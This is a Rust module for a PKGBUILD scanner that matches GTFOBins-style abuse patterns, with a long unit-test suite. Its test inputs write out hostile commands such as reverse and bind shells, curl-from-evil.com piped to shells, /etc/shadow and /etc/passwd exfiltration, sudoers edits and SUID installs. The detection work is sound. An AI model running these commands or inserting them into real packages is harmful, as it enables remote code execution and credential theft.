pub mod patterns;

use crate::features::Feature;
use crate::shared::models::PackageContext;
use crate::shared::scoring::{Signal, SignalCategory};

pub struct GtfobinsAnalysis;

impl Feature for GtfobinsAnalysis {
    fn name(&self) -> &str {
        "gtfobins_analysis"
    }

    fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
        let Some(ref content) = ctx.pkgbuild_content else {
            return Vec::new();
        };

        let compiled = patterns::compiled_patterns();
        let mut signals = Vec::new();

        for pat in compiled {
            if pat.regex.is_match(content) {
                signals.push(Signal {
                    id: pat.id.clone(),
                    category: SignalCategory::Pkgbuild,
                    points: pat.points,
                    description: pat.description.clone(),
                    is_override_gate: pat.override_gate,
                });
            }
        }

        signals
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn analyze(content: &str) -> Vec<String> {
        let ctx = PackageContext {
            name: "test-pkg".into(),
            metadata: None,
            pkgbuild_content: Some(content.into()),
            install_script_content: None,
            prior_pkgbuild_content: None,
            git_log: vec![],
            maintainer_packages: vec![],
        };
        GtfobinsAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
    }

    fn has(ids: &[String], id: &str) -> bool {
        ids.iter().any(|s| s == id)
    }

    // === Reverse Shells ===

    #[test]
    fn revshell_node() {
        let ids = analyze("node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'");
        assert!(has(&ids, "G-REVSHELL-NODE"), "got: {ids:?}");
    }

    #[test]
    fn revshell_julia() {
        let ids = analyze("julia -e 'using Sockets; s=TCPSocket(\"10.0.0.1\",4444)'");
        assert!(has(&ids, "G-REVSHELL-JULIA"), "got: {ids:?}");
    }

    #[test]
    fn revshell_tclsh() {
        let ids = analyze("tclsh <<< 'set s [socket 10.0.0.1 4444]'");
        assert!(has(&ids, "G-REVSHELL-TCLSH"), "got: {ids:?}");
    }

    #[test]
    fn revshell_jjs() {
        let ids = analyze("jjs -e 'var p=new java.lang.ProcessBuilder; Runtime.getRuntime().exec(\"/bin/sh\")'");
        assert!(has(&ids, "G-REVSHELL-JJS"), "got: {ids:?}");
    }

    #[test]
    fn revshell_ksh() {
        let ids = analyze("ksh -c 'exec 3<>/dev/tcp/10.0.0.1/4444'");
        assert!(has(&ids, "G-REVSHELL-KSH"), "got: {ids:?}");
    }

    #[test]
    fn revshell_gdb() {
        let ids = analyze("gdb -nx -ex 'python import socket,subprocess,os'");
        assert!(has(&ids, "G-REVSHELL-GDB"), "got: {ids:?}");
    }

    #[test]
    fn revshell_go() {
        let ids = analyze("go run revshell.go # uses net.Dial to connect back");
        assert!(has(&ids, "G-REVSHELL-GO"), "got: {ids:?}");
    }

    // === Bind Shells ===

    #[test]
    fn bindshell_socat() {
        let ids = analyze("socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh");
        assert!(has(&ids, "G-BINDSHELL-SOCAT"), "got: {ids:?}");
    }

    #[test]
    fn bindshell_nc() {
        let ids = analyze("nc -l -p 4444 -e /bin/sh");
        assert!(has(&ids, "G-BINDSHELL-NC"), "got: {ids:?}");
    }

    // === Pipe-to-Interpreter ===

    #[test]
    fn pipe_node() {
        let ids = analyze("curl http://evil.com/payload.js | node");
        assert!(has(&ids, "G-PIPE-NODE"), "got: {ids:?}");
    }

    #[test]
    fn pipe_ruby() {
        let ids = analyze("wget -qO- http://evil.com/x.rb | ruby");
        assert!(has(&ids, "G-PIPE-RUBY"), "got: {ids:?}");
    }

    #[test]
    fn pipe_php() {
        let ids = analyze("curl http://evil.com/backdoor.php | php");
        assert!(has(&ids, "G-PIPE-PHP"), "got: {ids:?}");
    }

    #[test]
    fn pipe_lua() {
        let ids = analyze("curl http://evil.com/payload.lua | lua");
        assert!(has(&ids, "G-PIPE-LUA"), "got: {ids:?}");
    }

    #[test]
    fn pipe_tclsh() {
        let ids = analyze("curl http://evil.com/script.tcl | tclsh");
        assert!(has(&ids, "G-PIPE-TCLSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_rscript() {
        let ids = analyze("curl http://evil.com/exploit.R | Rscript");
        assert!(has(&ids, "G-PIPE-RSCRIPT"), "got: {ids:?}");
    }

    #[test]
    fn pipe_julia() {
        let ids = analyze("curl http://evil.com/payload.jl | julia");
        assert!(has(&ids, "G-PIPE-JULIA"), "got: {ids:?}");
    }

    #[test]
    fn pipe_awk() {
        let ids = analyze("curl http://evil.com/exploit.awk | gawk -f -");
        assert!(has(&ids, "G-PIPE-AWK"), "got: {ids:?}");
    }

    #[test]
    fn pipe_jjs() {
        let ids = analyze("wget -qO- http://evil.com/nashorn.js | jjs");
        assert!(has(&ids, "G-PIPE-JJS"), "got: {ids:?}");
    }

    #[test]
    fn pipe_ksh() {
        let ids = analyze("curl http://evil.com/script.sh | ksh");
        assert!(has(&ids, "G-PIPE-KSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_csh() {
        let ids = analyze("curl http://evil.com/x | csh");
        assert!(has(&ids, "G-PIPE-CSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_zsh() {
        let ids = analyze("curl http://evil.com/x | zsh");
        assert!(has(&ids, "G-PIPE-ZSH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_fish() {
        let ids = analyze("curl http://evil.com/x | fish");
        assert!(has(&ids, "G-PIPE-FISH"), "got: {ids:?}");
    }

    #[test]
    fn pipe_dash() {
        let ids = analyze("curl http://evil.com/x | dash");
        assert!(has(&ids, "G-PIPE-DASH"), "got: {ids:?}");
    }

    #[test]
    fn alt_pipe_shell() {
        let ids = analyze("aria2c http://evil.com/script.sh -o - | sh");
        assert!(has(&ids, "G-ALT-PIPE-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn alt_pipe_shell_lwp() {
        let ids = analyze("lwp-download http://evil.com/x - | bash");
        assert!(has(&ids, "G-ALT-PIPE-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn alt_pipe_shell_finger() {
        let ids = analyze("finger payload@evil.com | sh");
        assert!(has(&ids, "G-ALT-PIPE-SHELL"), "got: {ids:?}");
    }

    // === Non-Obvious Command Execution ===

    #[test]
    fn tar_checkpoint() {
        let ids = analyze("tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
        assert!(has(&ids, "G-TAR-CHECKPOINT"), "got: {ids:?}");
    }

    #[test]
    fn zip_exec() {
        let ids = analyze("zip /tmp/x.zip /tmp/x -TT 'sh #'");
        assert!(has(&ids, "G-ZIP-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn gdb_exec() {
        let ids = analyze("gdb -nx --batch -ex 'shell id'");
        assert!(has(&ids, "G-GDB-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn vim_shell() {
        let ids = analyze("vim -c ':!sh'");
        assert!(has(&ids, "G-VIM-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn expect_exec() {
        let ids = analyze("expect -c 'spawn sh'");
        assert!(has(&ids, "G-EXPECT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn nsenter() {
        let ids = analyze("nsenter -t 1 -m -p -- /bin/sh");
        assert!(has(&ids, "G-NSENTER"), "got: {ids:?}");
    }

    #[test]
    fn capsh() {
        let ids = analyze("capsh -- -c 'id'");
        assert!(has(&ids, "G-CAPSH"), "got: {ids:?}");
    }

    #[test]
    fn unshare() {
        let ids = analyze("unshare -r /bin/bash");
        assert!(has(&ids, "G-UNSHARE"), "got: {ids:?}");
    }

    #[test]
    fn nmap_script() {
        let ids = analyze("nmap --script=http-backdoor 10.0.0.1");
        assert!(has(&ids, "G-NMAP-SCRIPT"), "got: {ids:?}");
    }

    #[test]
    fn ssh_proxycommand() {
        let ids = analyze("ssh -o ProxyCommand='sh -c /tmp/payload' x");
        assert!(has(&ids, "G-SSH-PROXYCOMMAND"), "got: {ids:?}");
    }

    #[test]
    fn pkexec() {
        let ids = analyze("pkexec /bin/sh");
        assert!(has(&ids, "G-PKEXEC"), "got: {ids:?}");
    }

    #[test]
    fn emacs_exec() {
        let ids = analyze("emacs -batch --eval '(shell-command \"id\")'");
        assert!(has(&ids, "G-EMACS-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn rlwrap_shell() {
        let ids = analyze("rlwrap nc 10.0.0.1 4444");
        assert!(has(&ids, "G-RLWRAP-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn sqlite_exec() {
        let ids = analyze("sqlite3 /dev/null '.shell /bin/sh'");
        assert!(has(&ids, "G-SQLITE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn screen_exec() {
        let ids = analyze("screen -X stuff 'id\\n'");
        assert!(has(&ids, "G-SCREEN-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn tmux_send() {
        let ids = analyze("tmux send-keys 'id' Enter");
        assert!(has(&ids, "G-TMUX-SEND"), "got: {ids:?}");
    }

    #[test]
    fn busybox_shell() {
        let ids = analyze("busybox nc -e /bin/sh 10.0.0.1 4444");
        assert!(has(&ids, "G-BUSYBOX-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn doas() {
        let ids = analyze("doas /bin/sh");
        assert!(has(&ids, "G-DOAS"), "got: {ids:?}");
    }

    #[test]
    fn chroot_shell() {
        let ids = analyze("chroot /newroot /bin/bash");
        assert!(has(&ids, "G-CHROOT-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn docker_run_volume() {
        let ids = analyze("docker run -v /:/host alpine sh");
        assert!(has(&ids, "G-DOCKER-RUN"), "got: {ids:?}");
    }

    #[test]
    fn systemd_run() {
        let ids = analyze("systemd-run /bin/sh");
        assert!(has(&ids, "G-SYSTEMD-RUN"), "got: {ids:?}");
    }

    #[test]
    fn strace_exec() {
        let ids = analyze("strace -o /dev/null /bin/sh");
        assert!(has(&ids, "G-STRACE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn script_exec() {
        let ids = analyze("script -c /bin/sh /dev/null");
        assert!(has(&ids, "G-SCRIPT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn flock_exec() {
        let ids = analyze("flock /tmp/lock bash -c 'curl http://evil.com | bash'");
        assert!(has(&ids, "G-FLOCK-EXEC"), "got: {ids:?}");
    }

    // === Alternative Download Utilities ===

    #[test]
    fn download_aria2c() {
        let ids = analyze("aria2c http://evil.com/payload");
        assert!(has(&ids, "G-DOWNLOAD-ARIA2C"), "got: {ids:?}");
    }

    #[test]
    fn download_lwp() {
        let ids = analyze("lwp-download http://evil.com/payload /tmp/x");
        assert!(has(&ids, "G-DOWNLOAD-LWP"), "got: {ids:?}");
    }

    #[test]
    fn download_tftp() {
        let ids = analyze("tftp 10.0.0.1 -c get payload");
        assert!(has(&ids, "G-DOWNLOAD-TFTP"), "got: {ids:?}");
    }

    #[test]
    fn download_finger() {
        let ids = analyze("finger payload@evil.com > /tmp/payload");
        assert!(has(&ids, "G-DOWNLOAD-FINGER"), "got: {ids:?}");
    }

    #[test]
    fn download_whois() {
        let ids = analyze("whois -h evil.com -p 4444 data");
        assert!(has(&ids, "G-DOWNLOAD-WHOIS"), "got: {ids:?}");
    }

    #[test]
    fn download_ftp() {
        let ids = analyze("ftp -n <<EOF\nopen evil.com\nget payload\nEOF");
        assert!(has(&ids, "G-DOWNLOAD-FTP"), "got: {ids:?}");
    }

    #[test]
    fn download_smbclient() {
        let ids = analyze("smbclient //evil.com/share -c 'get payload.bin'");
        assert!(has(&ids, "G-DOWNLOAD-SMBCLIENT"), "got: {ids:?}");
    }

    #[test]
    fn download_scp() {
        let ids = analyze("scp attacker@evil.com:/tmp/payload /tmp/payload");
        assert!(has(&ids, "G-DOWNLOAD-SCP"), "got: {ids:?}");
    }

    #[test]
    fn download_rsync() {
        let ids = analyze("rsync attacker@evil.com:/tmp/payload /tmp/payload");
        assert!(has(&ids, "G-DOWNLOAD-RSYNC"), "got: {ids:?}");
    }

    #[test]
    fn download_node() {
        let ids = analyze("npx evil-package");
        assert!(has(&ids, "G-DOWNLOAD-NODE"), "got: {ids:?}");
    }

    // === Interpreter Inline Execution ===

    #[test]
    fn node_inline() {
        let ids = analyze("node -e 'console.log(process.env.HOME)'");
        assert!(has(&ids, "G-NODE-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn ruby_inline() {
        let ids = analyze("ruby -e 'system(\"id\")'");
        assert!(has(&ids, "G-RUBY-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn php_inline() {
        let ids = analyze("php -r 'system(\"id\");'");
        assert!(has(&ids, "G-PHP-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn lua_inline() {
        let ids = analyze("lua -e 'os.execute(\"/bin/sh\")'");
        assert!(has(&ids, "G-LUA-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn r_inline() {
        let ids = analyze("Rscript -e 'system(\"id\")'");
        assert!(has(&ids, "G-R-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn julia_inline() {
        let ids = analyze("julia -e 'run(`id`)'");
        assert!(has(&ids, "G-JULIA-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn java_inline() {
        let ids = analyze("jshell -s <<< 'Runtime.getRuntime().exec(\"id\")'");
        assert!(has(&ids, "G-JAVA-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn tclsh_inline() {
        let ids = analyze("tclsh <<< 'exec id'");
        assert!(has(&ids, "G-TCLSH-INLINE"), "got: {ids:?}");
    }

    #[test]
    fn gdb_python() {
        let ids = analyze("gdb -nx -ex 'python import os; os.system(\"id\")'");
        assert!(has(&ids, "G-GDB-PYTHON"), "got: {ids:?}");
    }

    #[test]
    fn gnuplot_exec() {
        let ids = analyze("gnuplot -e 'system(\"id\")'");
        assert!(has(&ids, "G-GNUPLOT-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn octave_exec() {
        let ids = analyze("octave --eval 'system(\"id\")'");
        assert!(has(&ids, "G-OCTAVE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn guile_exec() {
        let ids = analyze("guile -c '(system \"id\")'");
        assert!(has(&ids, "G-GUILE-EXEC"), "got: {ids:?}");
    }

    // === Library Injection ===

    #[test]
    fn ld_library_path() {
        let ids = analyze("LD_LIBRARY_PATH=/tmp/evil ./binary");
        assert!(has(&ids, "G-LD-LIBRARY-PATH"), "got: {ids:?}");
    }

    #[test]
    fn ldconfig_custom() {
        let ids = analyze("ldconfig -f /tmp/evil.conf");
        assert!(has(&ids, "G-LDCONFIG-CUSTOM"), "got: {ids:?}");
    }

    // === File Operations ===

    #[test]
    fn tee_sensitive() {
        let ids = analyze("echo 'user ALL=(ALL) NOPASSWD: ALL' | tee /etc/sudoers");
        assert!(has(&ids, "G-TEE-SENSITIVE"), "got: {ids:?}");
    }

    #[test]
    fn cp_sensitive() {
        let ids = analyze("cp /etc/shadow /tmp/shadow_dump");
        assert!(has(&ids, "G-CP-SENSITIVE"), "got: {ids:?}");
    }

    // === Encoding/Exfiltration ===

    #[test]
    fn basenc_decode() {
        let ids = analyze("echo payload | basenc --base64 -d > /tmp/payload");
        assert!(has(&ids, "G-BASENC-DECODE"), "got: {ids:?}");
    }

    #[test]
    fn hping_exfil() {
        let ids = analyze("hping3 -c 1 -E /etc/passwd -d 500 evil.com");
        assert!(has(&ids, "G-HPING-EXFIL"), "got: {ids:?}");
    }

    #[test]
    fn restic_exfil() {
        let ids = analyze("restic -r rest:http://evil.com/repo backup /home");
        assert!(has(&ids, "G-RESTIC-EXFIL"), "got: {ids:?}");
    }

    // === False positive checks ===

    #[test]
    fn benign_pkgbuild_no_signals() {
        let ids = analyze(r#"
pkgname=yay
pkgver=12.4.2
pkgrel=1
arch=('x86_64')
depends=('pacman' 'git')
makedepends=('go')
source=("${pkgname}-${pkgver}.tar.gz::https://github.com/Jguer/yay/archive/v${pkgver}.tar.gz")
sha256sums=('abc123def456')

build() {
    cd "$pkgname-$pkgver"
    export CGO_CPPFLAGS="${CPPFLAGS}"
    export GOFLAGS="-buildmode=pie -trimpath"
    go build
}

package() {
    install -Dm755 yay "${pkgdir}/usr/bin/yay"
}
"#);
        assert!(ids.is_empty(), "Benign PKGBUILD should trigger no signals, got: {ids:?}");
    }

    #[test]
    fn benign_node_build_no_pipe() {
        // node is used in build process but not piped from download
        let ids = analyze(r#"
build() {
    cd "$pkgname-$pkgver"
    npm install
    npm run build
}
"#);
        // Should not trigger G-PIPE-NODE
        assert!(!has(&ids, "G-PIPE-NODE"), "npm install should not trigger pipe-to-node");
    }

    #[test]
    fn benign_tar_extract() {
        // Normal tar extract without checkpoint-action
        let ids = analyze("tar xf source.tar.gz");
        assert!(!has(&ids, "G-TAR-CHECKPOINT"), "Normal tar extract should not trigger");
    }

    #[test]
    fn benign_rsync_local() {
        // Local rsync without remote
        let ids = analyze("rsync -a src/ dest/");
        assert!(!has(&ids, "G-DOWNLOAD-RSYNC"), "Local rsync should not trigger");
    }

    // === Reverse/Bind Shell Gaps ===

    #[test]
    fn revshell_openssl_server() {
        let ids = analyze("openssl s_server -quiet -key key.pem -cert cert.pem -port 4444");
        assert!(has(&ids, "G-REVSHELL-OPENSSL"), "got: {ids:?}");
    }

    #[test]
    fn bindshell_go_listen() {
        let ids = analyze("go run server.go # uses net.Listen to bind");
        assert!(has(&ids, "G-BINDSHELL-GO"), "got: {ids:?}");
    }

    #[test]
    fn bindshell_lua_bind() {
        let ids = analyze("lua -e 'local s=require(\"socket\"); local srv=socket.bind(\"*\",4444)'");
        assert!(has(&ids, "G-BINDSHELL-LUA"), "got: {ids:?}");
    }

    #[test]
    fn busybox_wget() {
        let ids = analyze("busybox wget http://evil.com/payload -O /tmp/payload");
        assert!(has(&ids, "G-BUSYBOX-WGET"), "got: {ids:?}");
    }

    #[test]
    fn busybox_ftpd() {
        let ids = analyze("busybox ftpd -w /");
        assert!(has(&ids, "G-BUSYBOX-FTPD"), "got: {ids:?}");
    }

    // === Non-Obvious Command Execution Gaps ===

    #[test]
    fn find_exec_shell() {
        let ids = analyze("find / -name x -exec /bin/sh \\;");
        assert!(has(&ids, "G-FIND-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn xargs_shell() {
        let ids = analyze("echo 'id' | xargs bash -c 'eval $0'");
        assert!(has(&ids, "G-XARGS-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn sed_exec() {
        let ids = analyze("sed -n '1e id' /dev/stdin");
        assert!(has(&ids, "G-SED-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn split_filter() {
        let ids = analyze("split --filter=/bin/sh /dev/stdin");
        assert!(has(&ids, "G-SPLIT-FILTER"), "got: {ids:?}");
    }

    #[test]
    fn cpio_rsh() {
        let ids = analyze("echo x | cpio -o --rsh-command /bin/sh");
        assert!(has(&ids, "G-CPIO-RSH"), "got: {ids:?}");
    }

    #[test]
    fn dc_shell() {
        let ids = analyze("dc -e '!/bin/sh'");
        assert!(has(&ids, "G-DC-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn m4_exec() {
        let ids = analyze("m4 -D 'esyscmd(id)'");
        assert!(has(&ids, "G-M4-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn ip_netns_exec() {
        let ids = analyze("ip netns exec test_ns /bin/sh");
        assert!(has(&ids, "G-IP-NETNS-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn gcc_wrapper() {
        let ids = analyze("gcc -wrapper /bin/sh,-c main.c");
        assert!(has(&ids, "G-GCC-WRAPPER"), "got: {ids:?}");
    }

    #[test]
    fn cmake_exec() {
        let ids = analyze("cmake -E env sh -c 'id'");
        assert!(has(&ids, "G-CMAKE-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn psql_shell() {
        let ids = analyze("psql -c '\\! id'");
        assert!(has(&ids, "G-PSQL-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn dotnet_exec() {
        let ids = analyze("dotnet fsi script.fsx");
        assert!(has(&ids, "G-DOTNET-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn tcpdump_exec() {
        let ids = analyze("tcpdump -z /bin/sh -G 1 -w /dev/null");
        assert!(has(&ids, "G-TCPDUMP-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn docker_exec() {
        let ids = analyze("docker exec -it container /bin/sh");
        assert!(has(&ids, "G-DOCKER-EXEC"), "got: {ids:?}");
    }

    #[test]
    fn docker_cp() {
        let ids = analyze("docker cp container:/etc/shadow /tmp/shadow");
        assert!(has(&ids, "G-DOCKER-CP"), "got: {ids:?}");
    }

    #[test]
    fn nano_shell() {
        let ids = analyze("nano -s /bin/sh file.txt");
        assert!(has(&ids, "G-NANO-SHELL"), "got: {ids:?}");
    }

    #[test]
    fn code_tunnel() {
        let ids = analyze("code tunnel --accept-server-license-terms");
        assert!(has(&ids, "G-CODE-TUNNEL"), "got: {ids:?}");
    }

    // === Download Gaps ===

    #[test]
    fn download_sftp() {
        let ids = analyze("sftp attacker@evil.com");
        assert!(has(&ids, "G-DOWNLOAD-SFTP"), "got: {ids:?}");
    }

    #[test]
    fn download_sshfs() {
        let ids = analyze("sshfs user@evil.com:/data /mnt/remote");
        assert!(has(&ids, "G-DOWNLOAD-SSHFS"), "got: {ids:?}");
    }

    // === Library Load Gaps ===

    #[test]
    fn ssh_keygen_lib() {
        let ids = analyze("ssh-keygen -D /tmp/evil.so");
        assert!(has(&ids, "G-SSH-KEYGEN-LIB"), "got: {ids:?}");
    }

    #[test]
    fn mysql_lib() {
        let ids = analyze("mysql --default-auth=/tmp/evil.so -u root");
        assert!(has(&ids, "G-MYSQL-LIB"), "got: {ids:?}");
    }

    #[test]
    fn nginx_lib() {
        let ids = analyze("nginx -g 'load_module /tmp/evil.so;'");
        assert!(has(&ids, "G-NGINX-LIB"), "got: {ids:?}");
    }

    // === Privilege Escalation Gaps ===

    #[test]
    fn chattr_immutable() {
        let ids = analyze("chattr +i /tmp/malware");
        assert!(has(&ids, "G-CHATTR"), "got: {ids:?}");
    }

    #[test]
    fn chown_sensitive() {
        let ids = analyze("chown root:root /etc/shadow");
        assert!(has(&ids, "G-CHOWN-SENSITIVE"), "got: {ids:?}");
    }

    #[test]
    fn ln_sensitive() {
        let ids = analyze("ln -sf /tmp/evil /etc/sudoers");
        assert!(has(&ids, "G-LN-SENSITIVE"), "got: {ids:?}");
    }

    #[test]
    fn mount_bind() {
        let ids = analyze("mount --bind /tmp/evil /usr/bin");
        assert!(has(&ids, "G-MOUNT-BIND"), "got: {ids:?}");
    }

    #[test]
    fn install_suid() {
        let ids = analyze("install -m 4755 evil /usr/bin/evil");
        assert!(has(&ids, "G-INSTALL-SUID"), "got: {ids:?}");
    }

    // === File Write Gaps ===

    #[test]
    fn redis_write() {
        let ids = analyze("redis-cli config set dir /root/.ssh");
        assert!(has(&ids, "G-REDIS-WRITE"), "got: {ids:?}");
    }

    #[test]
    fn git_extdiff() {
        let ids = analyze("GIT_EXTERNAL_DIFF=/tmp/evil git diff");
        assert!(has(&ids, "G-GIT-EXTDIFF"), "got: {ids:?}");
    }

    // === Exfiltration Gaps ===

    #[test]
    fn ab_exfil() {
        let ids = analyze("ab -p /etc/passwd http://evil.com/collect");
        assert!(has(&ids, "G-AB-EXFIL"), "got: {ids:?}");
    }

    #[test]
    fn tailscale_exfil() {
        let ids = analyze("tailscale file cp /etc/shadow user@host:");
        assert!(has(&ids, "G-TAILSCALE-EXFIL"), "got: {ids:?}");
    }

    // === Additional false positive checks ===

    #[test]
    fn benign_find_no_exec_shell() {
        // Normal find usage without shell exec
        let ids = analyze("find . -name '*.o' -delete");
        assert!(!has(&ids, "G-FIND-EXEC"), "Normal find should not trigger");
    }

    #[test]
    fn benign_cmake_build() {
        // Normal cmake usage
        let ids = analyze("cmake -B build -DCMAKE_BUILD_TYPE=Release");
        assert!(!has(&ids, "G-CMAKE-EXEC"), "Normal cmake should not trigger");
    }

    #[test]
    fn benign_docker_build() {
        // Docker build without volume mount
        let ids = analyze("docker build -t myimage .");
        assert!(!has(&ids, "G-DOCKER-RUN"), "Docker build should not trigger run pattern");
        assert!(!has(&ids, "G-DOCKER-EXEC"), "Docker build should not trigger exec pattern");
    }

    #[test]
    fn benign_install_normal_mode() {
        // Normal install without SUID bits
        let ids = analyze("install -Dm755 binary /usr/bin/binary");
        assert!(!has(&ids, "G-INSTALL-SUID"), "Normal install should not trigger SUID pattern");
    }
}
